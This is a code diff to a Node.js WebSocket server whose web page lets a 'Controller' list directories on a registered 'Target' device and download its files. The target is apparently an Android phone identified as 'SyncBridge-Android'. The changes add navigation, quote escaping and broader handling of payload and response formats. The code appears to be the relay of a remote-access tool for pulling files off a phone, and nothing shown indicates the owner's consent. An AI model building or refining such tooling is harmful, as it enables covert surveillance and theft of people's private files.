@@ -24,20 +24,20 @@ app.get('/', (req, res) => {
         .status { font-weight: bold; padding: 5px 10px; border-radius: 4px; display: inline-block; margin-bottom: 15px; }
         .online { background: #d4edda; color: #155724; }
         .offline { background: #f8d7da; color: #721c24; }
-        input, button { padding: 10px; font-size: 16px; margin-top: 5px; box-sizing: border-box; }
-        input { width: 68%; }
-        button { width: 30%; background: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer; }
+        .nav-bar { display: flex; gap: 5px; margin-bottom: 10px; }
+        input, button { padding: 10px; font-size: 16px; box-sizing: border-box; }
+        input { flex: 1; }
+        button { background: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer; }
         button:hover { background: #0056b3; }
         ul { list-style: none; padding: 0; margin-top: 20px; }
         li { padding: 10px; border-bottom: 1px solid #eee; display: flex; justify-content: space-between; align-items: center; }
         .file-info { display: flex; flex-direction: column; }
-        .file-name { font-weight: bold; }
         .folder-link { font-weight: bold; color: #007bff; text-decoration: none; cursor: pointer; }
         .folder-link:hover { text-decoration: underline; }
         .file-meta { font-size: 12px; color: #666; margin-top: 2px; }
         li button { background: #28a745; width: auto; padding: 5px 10px; font-size: 14px; border: none; color: white; border-radius: 4px; cursor: pointer; }
         li button:hover { background: #218838; }
-        #toast { position: fixed; bottom: 20px; right: 20px; background: #333; color: white; padding: 10px 20px; border-radius: 4px; display: none; }
+        #toast { position: fixed; bottom: 20px; right: 20px; background: #333; color: white; padding: 10px 20px; border-radius: 4px; display: none; z-index: 1000; }
     </style>
 </head>
 <body>
@@ -45,7 +45,8 @@ app.get('/', (req, res) => {
         <h2>Remote File Manager</h2>
         <div>Target Status: <span id="status" class="status ${isOnline ? 'online' : 'offline'}">${statusText}</span></div>
         
-        <div>
+        <div class="nav-bar">
+            <button onclick="goUp()" title="Go up one directory" style="width: auto; background: #6c757d;">⬆ Up</button>
             <input type="text" id="pathInput" value="/sdcard/Download/" placeholder="Enter folder path">
             <button onclick="listDirectory()">List Files</button>
         </div>
@@ -85,7 +86,7 @@ app.get('/', (req, res) => {
 
                         let nameHtml = '';
                         if (isDir) {
-                            nameHtml = '<a class="folder-link" onclick="openDirectory(\\'' + name + '\\')">' + icon + name + '</a>';
+                            nameHtml = '<a class="folder-link" onclick="openDirectory(\\'' + name.replace(/'/g, "\\\\'") + '\\')">' + icon + name + '</a>';
                         } else {
                             nameHtml = '<span class="file-name">' + icon + name + '</span>';
                         }
@@ -95,7 +96,7 @@ app.get('/', (req, res) => {
                                 \${nameHtml}
                                 <span class="file-meta">\${isDir ? 'Directory' : 'File'}\${size}</span>
                             </div>
-                            \${!isDir ? '<button onclick="fetchFile(\\'' + name + '\\')">Download</button>' : ''}
+                            \${!isDir ? '<button onclick="fetchFile(\\'' + name.replace(/'/g, "\\\\'") + '\\')">Download</button>' : ''}
                         \`;
                         fileListEl.appendChild(li);
                     });
@@ -119,14 +120,14 @@ app.get('/', (req, res) => {
                     link.click();
                 } catch(e) {
                     console.error('Download failed:', e);
-                    showToast('Download failed: invalid data');
+                    showToast('Download failed: invalid data format');
                 }
             }
         };
 
         function listDirectory() {
-            const path = document.getElementById('pathInput').value;
-            ws.send(JSON.stringify({ action: 'LIST_FILES', path: path }));
+            const path = document.getElementById('pathInput').value.trim();
+            ws.send(JSON.stringify({ action: 'LIST_FILES', path: path, type: 'LIST_FILES' }));
         }
 
         function openDirectory(folderName) {
@@ -139,10 +140,20 @@ app.get('/', (req, res) => {
             listDirectory();
         }
 
+        function goUp() {
+            const input = document.getElementById('pathInput');
+            let parts = input.value.trim().split('/').filter(Boolean);
+            if (parts.length > 1) {
+                parts.pop();
+                input.value = '/' + parts.join('/') + '/';
+                listDirectory();
+            }
+        }
+
         function fetchFile(fileName) {
-            const basePath = document.getElementById('pathInput').value;
+            const basePath = document.getElementById('pathInput').value.trim();
             const fullPath = basePath.endsWith('/') ? basePath + fileName : basePath + '/' + fileName;
-            ws.send(JSON.stringify({ action: 'FETCH_FILE', filePath: fullPath, path: fullPath }));
+            ws.send(JSON.stringify({ action: 'FETCH_FILE', filePath: fullPath, path: fullPath, type: 'FETCH_FILE' }));
             showToast('Requesting file download...');
         }
 
@@ -178,7 +189,6 @@ wss.on('connection', (ws) => {
         try {
             const data = JSON.parse(rawText);
 
-            // Flexible matching for Target registration
             if (data.type === 'REGISTER_TARGET' || data.type === 'REGISTER_CLIENT' || data.client === 'SyncBridge-Android' || data.role === 'target' || data.type === 'target') {
                 clientType = 'TARGET';
                 targets.add(ws);
@@ -188,16 +198,15 @@ wss.on('connection', (ws) => {
                 return;
             }
 
-            // Controller registration
             if (data.type === 'REGISTER_CONTROLLER' || data.role === 'controller') {
                 clientType = 'CONTROLLER';
                 controllers.add(ws);
-                console.log('Web Controller connected. Total controllers:', controllers.size);
+                console.log('Web Controller connected.');
                 ws.send(JSON.stringify({ status: 'TARGET_STATUS', online: targets.size > 0 }));
                 return;
             }
 
-            // Route Controller -> Target with multi-key payload normalization
+            // Route Controller -> Target with exhaustive multi-key formatting
             if (clientType === 'CONTROLLER') {
                 if (targets.size > 0) {
                     const targetArr = Array.from(targets);
@@ -210,9 +219,10 @@ wss.on('connection', (ws) => {
                             action: data.action || data.type,
                             command: data.action || data.type,
                             path: reqPath,
-                            filePath: reqPath
+                            filePath: reqPath,
+                            file: reqPath
                         };
-                        console.log('Forwarding command to Target:', payload.action, 'Path:', reqPath);
+                        console.log('Forwarding to Target:', payload.action, 'Path/File:', reqPath);
                         activeTarget.send(JSON.stringify(payload));
                     }
                 } else {
@@ -225,7 +235,6 @@ wss.on('connection', (ws) => {
                 console.log('Received response from Target:', rawText);
                 let normalizedData = data;
                 
-                // Handle directory list responses
                 const fileArray = data.files || data.fileList || data.list || data.data;
                 if (fileArray || data.type === 'RESPONSE_LIST_FILES' || data.response === 'list_files' || data.action === 'list_files') {
                     normalizedData = {
@@ -233,12 +242,11 @@ wss.on('connection', (ws) => {
                         files: Array.isArray(fileArray) ? fileArray : []
                     };
                 }
-                // Handle file content responses
-                else if (data.content || data.fileData || data.type === 'RESPONSE_FILE_DATA') {
+                else if (data.content || data.fileData || data.type === 'RESPONSE_FILE_DATA' || data.data) {
                     normalizedData = {
                         action: 'FILE_DATA',
-                        fileName: data.fileName || data.name || 'downloaded_file',
-                        content: data.content || data.fileData
+                        fileName: data.fileName || data.name || data.filename || 'downloaded_file',
+                        content: data.content || data.fileData || data.data
                     };
                 }
 
@@ -257,11 +265,10 @@ wss.on('connection', (ws) => {
     ws.on('close', () => {
         if (clientType === 'TARGET') {
             targets.delete(ws);
-            console.log('Target Device disconnected. Remaining targets:', targets.size);
+            console.log('Target Device disconnected.');
             broadcastStatus();
         } else if (clientType === 'CONTROLLER') {
             controllers.delete(ws);
-            console.log('Web Controller connected count updated.');
         }
     });
 });
